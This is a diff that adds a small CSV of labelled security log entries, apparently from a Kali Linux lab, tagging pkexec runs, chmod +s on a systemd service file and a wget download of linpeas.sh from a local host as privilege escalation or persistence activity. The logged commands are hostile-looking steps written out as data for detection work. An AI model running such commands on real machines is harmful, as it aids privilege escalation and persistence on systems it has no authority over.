@@ -1,0 +1,6 @@
+"_time",host,User,Image,CommandLine,CurrentDirectory,"action_type","attack_type","detection_type"
+"2025-05-31T12:19:17.089+0530",kali,root,"/usr/bin/pkexec",pkexec,"/etc/systemd/system","pkexec Executed - Potential PrivEsc","Privilege Escalation Attempt","System File Abuse or PE Attempt"
+"2025-05-31T12:10:22.288+0530",kali,root,"/usr/bin/chmod","chmod +s masscopy-detector.service","/etc/systemd/system","Made Service Executable","Persistence via Service/Cron","System File Abuse or PE Attempt"
+"2025-05-31T11:47:34.807+0530",kali,root,"/usr/bin/chmod","chmod +x masscopy-detector.service","/etc/systemd/system","Made Service Executable","Persistence via Service/Cron","System File Abuse or PE Attempt"
+"2025-05-31T11:17:21.147+0530",kali,kali,"/usr/bin/pkexec","pkexec x-terminal-emulator","/home/kali","pkexec Executed - Potential PrivEsc","Privilege Escalation Attempt","System File Abuse or PE Attempt"
+"2025-05-31T11:42:00.000+0530",kali,root,"/usr/bin/chmod /usr/bin/wget","chmod +x linpeas.sh.1 wget http://192.168.1.3:8000/linpeas.sh","/root","Downloaded linPEAS Made linPEAS Executable","linPEAS Execution Step","Privilege Escalation Enumeration"
